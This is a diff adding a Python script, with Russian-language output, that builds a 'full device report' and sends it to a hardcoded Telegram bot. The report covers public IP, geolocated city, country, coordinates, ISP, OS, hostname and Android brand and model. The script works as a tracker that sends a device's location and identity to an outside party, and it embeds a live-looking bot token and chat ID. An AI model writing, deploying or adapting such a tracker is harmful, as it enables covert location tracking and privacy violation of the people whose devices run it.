@@ -1,0 +1,79 @@
+import datetime
+import requests
+import os
+import subprocess
+import platform
+
+class TelegramReporter:
+    def __init__(self, bot_token, allowed_user_id):
+        self.bot_token = bot_token
+        self.allowed_user_id = allowed_user_id
+        self.base_url = f"https://api.telegram.org/bot{self.bot_token}/"
+
+    def send_message(self, text):
+        url = self.base_url + "sendMessage"
+        payload = {
+            "chat_id": self.allowed_user_id,
+            "text": text,
+            "parse_mode": "Markdown"
+        }
+        try:
+            response = requests.post(url, json=payload)
+            if response.status_code == 200:
+                print("✅ Данные отправлены в Telegram")
+            else:
+                print(f"❌ Ошибка отправки: {response.text}")
+        except Exception as e:
+            print(f"❌ Ошибка соединения с Telegram: {e}")
+
+class FullDeviceTracker:
+    def __init__(self, telegram_reporter):
+        self.telegram = telegram_reporter
+
+    def collect_all_info(self):
+        report = "🔍 *Полный отчет об устройстве*\n\n"
+        
+        # Время
+        current_time = datetime.datetime.now()
+        report += f"🕒 *Время:* `{current_time.strftime('%Y-%m-%d %H:%M:%S')}`\n"
+        
+        # Местоположение
+        try:
+            location_data = requests.get('https://ipinfo.io/json', timeout=5).json()
+            report += (
+                "\n🌍 *Местоположение:*\n"
+                f"• *IP:* `{location_data.get('ip', 'неизвестно')}`\n"
+                f"• *Город:* `{location_data.get('city', 'неизвестно')}`\n"
+                f"• *Страна:* `{location_data.get('country', 'неизвестно')}`\n"
+                f"• *Координаты:* `{location_data.get('loc', 'неизвестно')}`\n"
+                f"• *Провайдер:* `{location_data.get('org', 'неизвестно')}`\n"
+            )
+        except Exception as e:
+            report += f"\n❌ *Ошибка определения местоположения:* `{str(e)}`\n"
+        
+        # Информация об устройстве
+        report += "\n📱 *Устройство:*\n"
+        report += f"• *ОС:* `{platform.system()} {platform.release()}`\n"
+        report += f"• *Архитектура:* `{platform.machine()}`\n"
+        report += f"• *Имя устройства:* `{platform.node()}`\n"
+        
+        # Дополнительно для Android
+        if os.name == 'posix':
+            try:
+                brand = subprocess.check_output(['getprop', 'ro.product.brand']).decode().strip()
+                model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
+                report += f"• *Производитель:* `{brand}`\n"
+                report += f"• *Модель:* `{model}`\n"
+            except:
+                report += "• *Данные модели:* `не удалось получить`\n"
+        
+        print(report)
+        self.telegram.send_message(report)
+
+if __name__ == "__main__":
+    BOT_TOKEN = "8140459609:AAGsjiHT6QQm9fwLMNWQuhzcHdjytIX7Qik"
+    ALLOWED_USER_ID = "7656244130"
+    
+    reporter = TelegramReporter(BOT_TOKEN, ALLOWED_USER_ID)
+    tracker = FullDeviceTracker(reporter)
+    tracker.collect_all_info()
